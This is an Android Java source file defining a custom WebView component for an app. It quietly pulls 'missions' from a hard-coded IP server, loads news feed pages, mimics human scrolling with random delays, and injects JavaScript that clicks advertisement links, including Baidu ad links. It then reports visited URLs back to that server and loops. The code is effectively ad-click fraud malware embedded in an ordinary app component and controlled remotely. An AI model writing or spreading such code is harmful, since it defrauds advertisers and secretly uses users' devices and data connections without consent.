package com.pbph.yuguo.myview;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.content.Context;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.util.AttributeSet;
import android.util.Log;
import android.webkit.JsPromptResult;
import android.webkit.JsResult;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MyFeedsBackActionWebview extends WebView {

    private final static int GET_MISSION = 0x221;
    private final static int SEND_LOG = 0x222;
    private final static int MISSION_COMPLETE = 0x223;
    private final static int MISSION = 0x224;
    private final static int CLICK_MORE = 0x225;
    private final static int TO_BOTTOM = 0x226;
    private ExecutorService fixedThreadPool = Executors
            .newFixedThreadPool(3);
    private List<String> urlList = new ArrayList<String>();
    private String get_mission_url = "http://47.94.122.55:8888/getUrl.ashx?uid=%s";
    private String success_url = "http://47.94.122.55:8888/compStatu.ashx?g=%s";
    private String log_url = "http://47.94.122.55:8888/writeLog.ashx?g=%s&n=%s&c=%s";
    private Random random = new Random();
    private String guid, uid = "";
    private String packageName = "";
    private String isReadAd = "0";
    private String isGoBack = "0";
    private String isDetail = "0";
    private int time = 60;
    private int step = 0;
    private String adUrl = "";
    private String homePath = "";
    private int count = 0;
    private int viewCount = 0;


    public MyFeedsBackActionWebview(Context context) {
        super(context);
        Log.e("MyFeedsWebview", "init");
    }

    public MyFeedsBackActionWebview(Context context, AttributeSet attrs) {
        super(context, attrs);
        Log.e("MyFeedsWebview", "init1");
    }

    public MyFeedsBackActionWebview(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);
        Log.e("MyFeedsWebview", "init2");
    }
//        var arr=[];for(a of document.querySelectorAll(".J_Ad_Link.n-multipic")){arr.push({href:a.href, text:a.querySelector(".n-publisher").innerHTML});}

    @TargetApi(17)
    public void initBackWebView() {
        getSettings().setJavaScriptEnabled(true);
        getSettings().setDomStorageEnabled(true);
        viewCount = getViewCount();
        getSettings().setDefaultTextEncodingName("UTF-8");
        getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);
        setWebViewClient(new MyWebViewClient());
        setWebChromeClient(new MyWebChromeClient());
        try {
//            if (TextUtils.isEmpty(getLink())) {
            getMission();
//            } else {
//                loadUrl(homePath);
//            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        int h = getLayoutParams().height;
        int w = getLayoutParams().width;
        Log.e("feed", h + "   " + w);
        Log.e("feed", getRight() + "   " + getLeft() + "   " + getLeft() + "   " + getRight());
        Log.e("feed", getX() + "   " + getY() + "   " + getScrollX() + "   " + getScrollY());
    }

    private void missionComplete() {
        Log.e("missionComplete", "任务完成");
        String url = String.format(success_url, guid);
        httpGet(url, MISSION_COMPLETE);
    }

    private void getMission() {
        Log.e("getMission", "获取任务");
        String url = String.format(get_mission_url, uid);
        httpGet(url, GET_MISSION);
    }


    private void sendLog(String url) {
        try {
            Log.e("sendLog", "发送日志");
            String conten_url = URLEncoder.encode(url, "utf-8");
            String send_url = String.format(log_url, guid, step, conten_url);
            httpGet(send_url, SEND_LOG);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void httpGet(final String url, final int code) {
        fixedThreadPool.execute(new Runnable() {
            public void run() {
                try {
//                    Log.e("url", "url=" + url);
                    URL httpurl = new URL(url);
                    HttpURLConnection httpConn = (HttpURLConnection) httpurl.openConnection();
                    httpConn.setConnectTimeout(1000 * 30);
                    httpConn.setReadTimeout(1000 * 30);
                    httpConn.setDoOutput(true);
                    httpConn.setDoInput(true);
                    httpConn.setUseCaches(false);
                    httpConn.setRequestMethod("GET");
                    int responseCode = httpConn.getResponseCode();
                    if (HttpURLConnection.HTTP_OK == responseCode) {
                        InputStream inputStream = httpConn.getInputStream();
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        byte[] buffer = new byte[1024];
                        int len;
                        while ((len = inputStream.read(buffer)) != -1) {
                            baos.write(buffer, 0, len);
                        }
                        String str = new String(baos.toByteArray());
//                        Log.e("result", "result   =  " + str);
                        Message message = Message.obtain();
                        message.what = code;
                        message.obj = str;
                        handler.sendMessage(message);
                        baos.close();
                        inputStream.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }

//    private String getLink() throws JSONException {
//        String link = preference.getString("link", "");
//        if (!TextUtils.isEmpty(link)) {
//            getMissionInfo(new JSONObject(link));
//        }
//        Log.e("link", "link=   " + link);
//        return link;
//    }
//
//    private void setLink(String url) {
//        boolean b = preference.edit().putString("link", url).commit();
//        Log.e("setLink", b + "");
//    }
//    private void getLink() {
//        update_url = preference.getString("link", "");
//        Log.e("getLink", "update_url=   " + update_url);
//    }
//
//    private void setLink(String url) {
//        boolean b = preference.edit().putString("link", url).commit();
//        Log.e("setLink", b + "");
//    }

    private class MyWebChromeClient extends WebChromeClient {
        @Override
        public void onProgressChanged(WebView view, int progress) {
            if (progress == 100) {

            }
        }

        @Override
        public boolean onJsAlert(WebView view, String url, String message, final JsResult result) {
            return true;
        }

        @Override
        public boolean onJsConfirm(WebView view, String url, String message, final JsResult result) {
            return true;
        }

        @Override
        public boolean onJsPrompt(WebView view, String url, String message, String defaultValue,
                                  final JsPromptResult result) {
            return true;
        }
    }

    @SuppressLint("NewApi")
    private class MyWebViewClient extends WebViewClient {

        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {// 网页页面开始加载的时候
            super.onPageStarted(view, url, favicon);
        }

        @Override
        public void onPageFinished(final WebView view, final String url) {// 网页加载结束的时候
            Log.e("onPageFinished", "onPageFinished......." + url);
//            Log.e("feed", h + "   " + w);
            Log.e("feed", getRight() + "   " + getLeft() + "   " + getLeft() + "   " + getRight());
            Log.e("feed", getX() + "   " + getY() + "   " + getScrollX() + "   " + getScrollY());
            missionStep(url);
        }

        @SuppressWarnings("deprecation")
        @Override
        public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
            view.stopLoading();
            view.clearView();
            view.loadUrl("file:///android_asset/404.html");
        }

//        @Override
//        public boolean shouldOverrideUrlLoading(WebView view, String url) { // 网页加载时的连接的网址
////            view.loadUrl(url, getHeadMap(packageName));
//            view.loadUrl(url);
//            return true;
//        }
    }

    //    feed子页 新闻链接
//    n-item-link n-single-pic
//    feed子页广告链接
//    J_Ad_Link n-single-pic n-single-ad
//    private synchronized void missionStep(String url) {
//        if (urlList.contains(url)) {
//            if (step == 2 && url.equals(homePath)) {
//                step = 1;
//                if (count > viewCount) {
//                    step = 3;
//                }
//                Log.e("step", "step= " + step);
//                Log.e("count", "count= " + count);
//                count++;
//                Log.e("missionStep包含", step + "返回FEEDS频道首页");
//
//            } else if (step == 1) {
//                step = 2;
//                Log.e("missionStep包含", step + "打开FEEDS频道子页");
//            }
//            sendLog(url);
//            waitExecuteMission();
//            return;
//        }
//        if (step == 5) {
//            Log.e("step", step + "");
//            return;
//        }
//        urlList.add(url);
//        if (url.equals(homePath)) {
//            //各大门户频道新闻链接
//            step = 1;
//            Log.e("missionStep", step + "  打开FEEDS频道首页");
//        } else if (url.contains(homePath)) {
//            //feeds频道首页链接
//            step = 2;
//            Log.e("missionStep", step + "  打开FEEDS频道子页");
//        } else if (url.startsWith("http://cpro.baidu.com/")) {
//            //feeds广告链接
//            step = 4;
//            if (url.startsWith("https://m.baidu.com/mobads.php")) {
//                step = 5;
//                return;
//            }
//            Log.e("missionStep", step + "  打开FEEDS广告链接");
//        } else {
//            step = 5;
//            Log.e("missionStep", step + "   任务完成");
//        }
//        sendLog(url);
//        waitExecuteMission();
//    }
//    private synchronized void missionStep(String url) {
//        getFocus();
//        if (urlList.contains(url)) {
//            if (step == 2 && url.equals(homePath)) {
//                step = 1;
//                Log.e("viewCount", "viewCount= " + viewCount);
////                if (count >= viewCount) {
////                    step = "0".equals(isReadAd) ? 3 : 5;
////                }
//                count++;
//                Log.e("step", "step= " + step);
//                Log.e("count", "count= " + count);
//                Log.e("missionStep包含", step + "返回FEEDS频道首页");
//                sendLog(url);
//                waitExecuteMission(MISSION, (random.nextInt(10) + 30));
//            } else if (step == 1 && url.contains("detail")) {
//                step = 2;
//                Log.e("viewCount", "viewCount= " + viewCount);
//                if (count >= viewCount) {
//                    step = "0".equals(isReadAd) ? 3 : 5;
//                }
//                Log.e("missionStep包含", step + "再次打开FEEDS频道子页");
//                waitExecuteMission(CLICK_MORE, (random.nextInt(5) + 5));
//                waitExecuteMission(TO_BOTTOM, (random.nextInt(5) + 10));
//                sendLog(url);
//                waitExecuteMission(MISSION, (random.nextInt(10) + 30));
//            }
//            return;
//        }
//        if (step == 5) {
//            Log.e("step", step + "");
//            return;
//        }
//        urlList.add(url);
//        if (url.equals(homePath)) {
//            step = 1;
//            Log.e("missionStep", step + "  打开FEEDS频道首页");
//        } else if (url.contains(homePath) && url.contains("detail")) {
//            step = 2;
//            if (count >= viewCount) {
//                step = "0".equals(isReadAd) ? 3 : 5;
//            }
//            waitExecuteMission(CLICK_MORE, (random.nextInt(5) + 5));
//            waitExecuteMission(TO_BOTTOM, (random.nextInt(5) + 10));
//            Log.e("missionStep", step + "  打开FEEDS频道子页");
//        } else if (url.startsWith("http://cpro.baidu.com/")) {
//            step = 4;
//            if (url.startsWith("https://m.baidu.com/mobads.php")) {
//                step = 5;
//                return;
//            }
//            Log.e("missionStep", step + "  打开FEEDS广告链接");
//        } else {
//            step = 5;
//            Log.e("missionStep", step + "   任务完成");
//        }
//        sendLog(url);
//        waitExecuteMission(MISSION, (random.nextInt(10) + 30));
//    }


    private synchronized void missionStep(String url) {
        getFocus();
        if (url.equals(homePath)) {
            step = 1;
            count++;
            Log.e("viewCount", "viewCount= " + viewCount);
            Log.e("count", "count= " + count);
            if (count > viewCount) {
                step = 5;
            }
            waitExecuteMission(CLICK_MORE, (random.nextInt(5) + 5));
            Log.e("missionStep", step + "  打开FEEDS频道首页");
        } else if (url.contains(homePath) && url.contains("detail")) {
            step = 2;
            if (count >= viewCount) {
                step = "0".equals(isReadAd) ? 3 : 5;
            }
            waitExecuteMission(CLICK_MORE, (random.nextInt(5) + 5));
            waitExecuteMission(TO_BOTTOM, (random.nextInt(5) + 10));
            Log.e("missionStep", step + "  打开FEEDS频道子页");
        } else if (url.startsWith("http://cpro.baidu.com/")) {
            step = 4;
            if (url.startsWith("https://m.baidu.com/mobads.php")) {
                step = 5;
                return;
            }
            Log.e("missionStep", step + "  打开FEEDS广告链接");
            waitExecuteMission(MISSION, (random.nextInt(10) + 15));
            return;
        } else {
            step = 5;
            Log.e("missionStep", step + "   任务完成");
            sendLog(url);
            waitExecuteMission(MISSION, (random.nextInt(10) + 5));
            return;
        }
        sendLog(url);
        waitExecuteMission(MISSION, (random.nextInt(10) + time));
    }

    private void executeNextMission() {
        switch (step) {
            case 1:
                if ("0".equals(isDetail)) {
                    getMorePicCount();
                } else {
                    loadUrl(homePath);
                }
                break;
            case 2:
                if ("0".equals(isGoBack)) {
                    Log.e("back", "返回首页");
                    goBack();
                } else {
                    Log.e("back", "刷新首页");
                    loadUrl(homePath);
                }
                break;
            case 3:
                getAdCount();
                count = 0;
                break;
            case 4:
                checkAdTpl1();
                break;
            case 5:
                missionComplete();
                break;
            default:
                break;
        }
    }

    private void getMissionInfo(JSONObject object) throws JSONException {
        Log.e("getMissionInfo", "getMissionInfo=" + object.toString());
        guid = object.getString("g");
        if (guid.length() > 30) {
//            homePath = object.getString("a");
            homePath = object.getString("b");
            packageName = object.getString("p");
            isReadAd = object.getString("ad");
            isGoBack = object.getString("af");
            isDetail = object.getString("df");
            try {
                viewCount = object.getInt("rd");
            } catch (JSONException e) {
                viewCount = 4;
            }
            try {
                time = object.getInt("rt");
            } catch (JSONException e) {
                e.printStackTrace();
                time = 60;
            }
        }
    }

    Handler handler = new Handler() {
        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            switch (msg.what) {
                case MISSION:
                    executeNextMission();
                    break;
                case GET_MISSION:
                    try {
                        if (step != 0) {
                            return;
                        }
                        JSONObject object = new JSONObject((String) msg.obj);
                        getMissionInfo(object);
                        if (guid.length() > 30) {
                            loadUrl(homePath);
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                    break;
                case SEND_LOG:
                    break;
                case MISSION_COMPLETE:
//                    Log.e("清除", "清除本地数据");
//                    setLink("");
                    reStartMission();
                    break;
                case CLICK_MORE:
                    toBottom();
                    break;
                case TO_BOTTOM:
                    clickMore();
                    waitExecuteMission(CLICK_MORE, (random.nextInt(5) + 5));
                    break;
            }
        }
    };

    private void waitExecuteMission() {
        fixedThreadPool.execute(new Runnable() {
            @Override
            public void run() {
                int second = random.nextInt(10) + 20;
                Log.e("second", "second= " + second);
                try {
                    Thread.sleep(second * 1000);
                    handler.sendEmptyMessage(MISSION);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    private void waitExecuteMission(final int what, final int second) {
        fixedThreadPool.execute(new Runnable() {
            @Override
            public void run() {
//                int second = random.nextInt(10) + 30;
//                Log.e("second", "second= " + second);
                if (what == CLICK_MORE) {
                    Log.e("waitExecuteMission", "打开更多");
                } else if (what == TO_BOTTOM) {
                    Log.e("waitExecuteMission", "下滑");
                }
                try {
                    Thread.sleep(second * 1000);
                    handler.sendEmptyMessage(what);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    private int getViewCount() {
        return random.nextInt(5) + 2;
    }

    private void reStartMission() {
        count = 0;
        step = 0;
        viewCount = getViewCount();
        try {
            urlList.clear();
        } catch (Exception e) {
            e.printStackTrace();
        }
        getMission();
    }

    @TargetApi(19)
    private void getFocus() {
        evaluateJavascript(windowFocusJS(), new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String s) {
                Log.e("getFocus", s);
            }
        });
    }

    @TargetApi(19)
    public void toBottom() {
        flingScroll(0, 5000);
//        evaluateJavascript(scrollMoveJS(), new ValueCallback<String>() {
//            @Override
//            public void onReceiveValue(String s) {
//                Log.e("onReceiveValue", s);
//            }
//        });
//        evaluateJavascript(scrollBottomJS(), new ValueCallback<String>() {
//            @Override
//            public void onReceiveValue(String s) {
//                Log.e("onReceiveValue", s);
//            }
//        });
    }

    @TargetApi(19)
    private void clickMore() {
        evaluateJavascript(clickMoreJS(), new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String s) {
                Log.e("clickMore", "clickMore= " + s);
            }
        });
    }

    private String scrollMoveJS() {
//        return "javascript:var a=0;setInterval(function(){if(a<document.documentElement.scrollHeight-100){window.scrollTo(0,a);}a+=Math.floor(Math.random()*10+5);}, 10);";
        return "javascript:var a=0;setInterval(function(){if(a<window.innerHeight-50){window.scrollTo(0,a);}a+=Math.floor(Math.random()*10+5);}, 10);";
//        return "javascript:var h = $(document).height()-$(window).height();$(document).scrollTop(h);";
//        return "javascript: var h = document.documentElement.scrollHeight || document.body.scrollHeight;window.scrollTo(h,h);";
    }

    private String windowFocusJS() {
        return "javascript:window.focus;";
    }

    private String clickMoreJS() {
        return "javascript:document.getElementById('more-content').click();";
    }

    private String getCheckAdTpl1JS() {
        return "javascript:document.getElementsByClassName('news-item tpl-1').length;";
    }

    private String getCheckAdTpl2JS() {
        return "javascript:document.getElementsByClassName('news-item tpl-2').length;";
    }

    private String getClickAdTpl1JS() {

//        var btn = document.querySelectorAll('.tpl-2')[0].getElementsByTagName("a")[0];
//　　var event = document.createEvent("MouseEvents");
//　　event.initMouseEvent("click", true, true, window, 0, 0, 0, 0, 0,false, false, false, false, 0, btn);
//　　btn.dispatchEvent(event);

//        var a= document.querySelectorAll('.tpl-1')[0].getElementsByTagName("a")[0];
//        var X= a.getBoundingClientRect().left+document.documentElement.scrollLeft;
//        var Y = a.getBoundingClientRect().top+document.documentElement.scrollTop;

        return "javascript:document.querySelectorAll('.tpl-1')[0].getElementsByTagName(\"a\")[0].click();";
//        return "javascript:document.getElementsByClassName('news-item tpl-1')[0].getElementsByTagName(\"a\")[0].href;";
    }

    private String getClickAdTpl2JS() {
        return "javascript:document.querySelectorAll('.tpl-2')[0].getElementsByTagName(\"a\")[0].click();";
    }

    private String getAdUrlJS(int index) {
        return "javascript:document.getElementsByClassName('n-single-vid-ad J_Ad_Link n-big-ad')[" + index + "].click();";
//        return "javascript:document.getElementsByClassName('J_Ad_Link n-multipic')[" + index + "].click();";
    }

    private String getAdCountJS() {

//        return "javascript:document.getElementsByClassName('J_Ad_Link n-multipic').length;";
//        n-item-ad ad-item container left-img-ad ad-item-big
        return "javascript:document.getElementsByClassName('n-single-vid-ad J_Ad_Link n-big-ad').length;";
    }

    private String getMorePicCountJS() {
        return "javascript:document.getElementsByClassName('n-item-link n-multipic').length;";
    }

    private String getClickMorePicUrlJS(int index) {
        return "javascript:document.getElementsByClassName('n-item-link n-multipic')[" + index + "].click();";
    }

    @TargetApi(19)
    private void getAdUrl(int index) {
        Log.e("getAdUrl", "index= " + index);
        evaluateJavascript(getAdUrlJS(index), new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String s) {
//                try {
//                    adUrl = s.replace("\"", "");
                Log.e("getAdUrl", s);
//                } catch (Exception e) {
//                    e.printStackTrace();
//                }
            }
        });
    }

    @TargetApi(19)
    private void openMorePic(int index) {
        Log.e("openMorePic", "index= " + index);
        evaluateJavascript(getClickMorePicUrlJS(index), new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String s) {
                Log.e("onReceiveValue", s);
            }
        });
    }

    @TargetApi(19)
    private void checkAdTpl1() {
        evaluateJavascript(getCheckAdTpl1JS(), new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String s) {
                if (!"null".equals(s) && !TextUtils.isEmpty(s)) {
                    try {
                        Log.e("checkAdTpl1", "checkAdTpl1Count= " + s);
                        int index = Integer.valueOf(s);
                        if (index > 0) {
                            clickADTpl1();
                        } else {
                            checkAdTpl2();
                        }
                    } catch (NumberFormatException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }

    @TargetApi(19)
    private void checkAdTpl2() {
        evaluateJavascript(getCheckAdTpl2JS(), new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String s) {
                if (!"null".equals(s) && !TextUtils.isEmpty(s)) {
                    try {
                        Log.e("checkAdTpl2", "checkAdTpl2Count= " + s);
                        int index = Integer.valueOf(s);
                        if (index > 0) {
                            clickADTpl2();
                        } else {
                            missionComplete();
                        }
                    } catch (NumberFormatException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }

    @TargetApi(19)
    private void clickADTpl1() {
        loadUrl(getClickAdTpl1JS());
//        evaluateJavascript(getClickAdTpl1JS(), new ValueCallback<String>() {
//            @Override
//            public void onReceiveValue(String s) {
//                Log.e("clickADTpl1", s);
////                if (!"null".equals(s) && !TextUtils.isEmpty(s)) {
////                    loadUrl(s.replaceAll("\"", ""), getHeadMap(packageName));
////                }
//            }
//        });
    }

    @TargetApi(19)
    private void clickADTpl2() {
        loadUrl(getClickAdTpl2JS());
//        evaluateJavascript(getClickAdTpl2JS(), new ValueCallback<String>() {
//            @Override
//            public void onReceiveValue(String s) {
//                Log.e("clickADTpl2", s);
////                if (!"null".equals(s) && !TextUtils.isEmpty(s)) {
////                    loadUrl(s.replaceAll("\"", ""), getHeadMap(packageName));
////                }
//            }
//        });
    }

    @TargetApi(19)
    private void getMorePicCount() {
        evaluateJavascript(getMorePicCountJS(), new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String s) {
                if (!"null".equals(s) && !TextUtils.isEmpty(s)) {
                    try {
                        Log.e("getMorePicCount", "getMorePicCount= " + s);
                        int index = Integer.valueOf(s);
                        if (index > 0) {
                            openMorePic(random.nextInt(index));
                        } else {
                            missionComplete();
                        }
                    } catch (NumberFormatException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }

    @TargetApi(19)
    private void getAdCount() {
        evaluateJavascript(getAdCountJS(), new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String s) {
                if (!"null".equals(s) && !TextUtils.isEmpty(s)) {
                    try {
                        Log.e("getAdCount", "count= " + s);
                        int index = Integer.valueOf(s);
                        if (index > 0) {
                            Random random = new Random();
                            getAdUrl(random.nextInt(index));
                        } else {
                            missionComplete();
                        }
                    } catch (NumberFormatException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }


    private Map<String, String> getHeadMap(String packageName) {
        Map<String, String> extraHeaders = new HashMap<String, String>();
        if (!TextUtils.isEmpty(packageName)) {
//            extraHeaders.put("Referer", "http://mobads.baidu.com/" + packageName);
            extraHeaders.put("X-Requested-With", packageName);
        }
        return extraHeaders;
    }


//    private void startSecond() {
//        if (second_is_run) {
//            return;
//        }
//        Log.e("startSecond", "开始计时");
//        downTimer.stopDown();
//        downTimer.startDown(time * 1000);
//        second_is_run = true;
//    }

//    @Override
//    public void onTick(long millisUntilFinished) {
//    }
//
//    @Override
//    public void onFinish() {
//        second_is_run = false;
//        stopLoading();
//        Log.e("onFinish", "任务已完成");
//        missionComplete();
//    }

    @Override
    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
        int expandSpec = MeasureSpec.makeMeasureSpec(Integer.MAX_VALUE >> 2, MeasureSpec.AT_MOST);
        super.onMeasure(widthMeasureSpec, expandSpec);
    }

    public void destoryBackWebView() {
        try {
            clearHistory();
            clearFormData();
            clearCache(true);
            removeAllViews();
            destroy();
            fixedThreadPool.shutdownNow();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


}